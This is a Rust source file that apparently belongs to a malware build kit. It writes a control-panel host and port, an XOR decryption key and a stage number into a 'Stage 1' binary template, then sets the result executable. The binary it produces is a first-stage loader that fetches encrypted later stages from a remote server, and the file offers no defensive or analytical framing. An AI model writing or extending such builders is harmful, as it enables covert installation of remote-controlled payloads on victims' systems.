//! Stage 1 Builder
//!
//! Patches configuration into Stage 1 binary:
//! - Panel host/port
//! - XOR key for decryption
//! - Stage number to fetch

use anyhow::{Context, Result, bail};
use std::fs;
use std::path::Path;
use crate::constants::STAGE1_MAGIC;

/// Maximum sizes from config.h
const MAX_URL_LEN: usize = 512;
const MAX_KEY_LEN: usize = 32;

/// Config structure layout (must match stage1/src/config.h)
#[repr(C, packed)]
struct Stage1Config {
    magic: u32,
    flags: u32,
    stage2_port: u16,
    stage_number: u16,
    xor_key: [u8; MAX_KEY_LEN],
    xor_key_len: u8,
    reserved: [u8; 3],
    stage2_host: [u8; MAX_URL_LEN],
}

/// Build patched Stage 1 binary.
pub fn build_stage1(
    template_path: &Path,
    output_path: &Path,
    host: &str,
    port: u16,
    stage_number: u16,
    xor_key: &[u8],
) -> Result<()> {
    // Validate inputs
    if host.len() >= MAX_URL_LEN {
        bail!("Host too long (max {} chars)", MAX_URL_LEN - 1);
    }
    if xor_key.is_empty() || xor_key.len() > MAX_KEY_LEN {
        bail!("XOR key must be 1-{} bytes", MAX_KEY_LEN);
    }
    if stage_number < 2 || stage_number > 3 {
        bail!("Stage number must be 2 or 3");
    }

    // Read template binary
    let mut binary = fs::read(template_path)
        .with_context(|| format!("Failed to read template: {}", template_path.display()))?;

    // Find config by magic bytes
    let magic_bytes = STAGE1_MAGIC.to_le_bytes();
    let config_offset = find_pattern(&binary, &magic_bytes)
        .context("Config magic not found in binary")?;

    // Build new config
    let mut new_config = Stage1Config {
        magic: STAGE1_MAGIC,
        flags: 0,
        stage2_port: port,
        stage_number,
        xor_key: [0u8; MAX_KEY_LEN],
        xor_key_len: xor_key.len() as u8,
        reserved: [0u8; 3],
        stage2_host: [0u8; MAX_URL_LEN],
    };

    // Copy XOR key
    new_config.xor_key[..xor_key.len()].copy_from_slice(xor_key);

    // Copy host (null-terminated)
    new_config.stage2_host[..host.len()].copy_from_slice(host.as_bytes());

    // Serialize config to bytes
    let config_bytes = unsafe {
        std::slice::from_raw_parts(
            &new_config as *const _ as *const u8,
            std::mem::size_of::<Stage1Config>(),
        )
    };

    // Patch binary
    let end_offset = config_offset + config_bytes.len();
    if end_offset > binary.len() {
        bail!("Config extends beyond binary end");
    }
    binary[config_offset..end_offset].copy_from_slice(config_bytes);

    // Write output
    fs::write(output_path, &binary)
        .with_context(|| format!("Failed to write output: {}", output_path.display()))?;

    // Make executable on Unix
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(output_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(output_path, perms)?;
    }

    Ok(())
}

/// Find pattern in binary, return offset.
fn find_pattern(data: &[u8], pattern: &[u8]) -> Option<usize> {
    data.windows(pattern.len())
        .position(|window| window == pattern)
}
